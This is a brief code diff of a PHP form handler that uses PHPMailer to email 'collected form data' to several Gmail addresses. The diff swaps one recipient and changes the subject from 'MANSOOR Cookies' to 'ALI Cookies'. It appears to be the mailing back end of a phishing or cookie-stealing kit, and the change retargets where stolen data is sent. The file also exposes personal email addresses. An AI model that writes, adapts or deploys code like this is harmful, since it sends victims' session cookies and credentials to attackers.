@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('patjckbang@gmail.com', 'PASSWORD');
-        $mail->addAddress('leonelsoto6666@gmail.com');
+        $mail->addAddress('official.alessiovan@gmail.com');
        $mail->addAddress('uffemail215@gmail.com');
 
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'MANSOOR Cookies';
+        $mail->Subject = 'ALI  Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
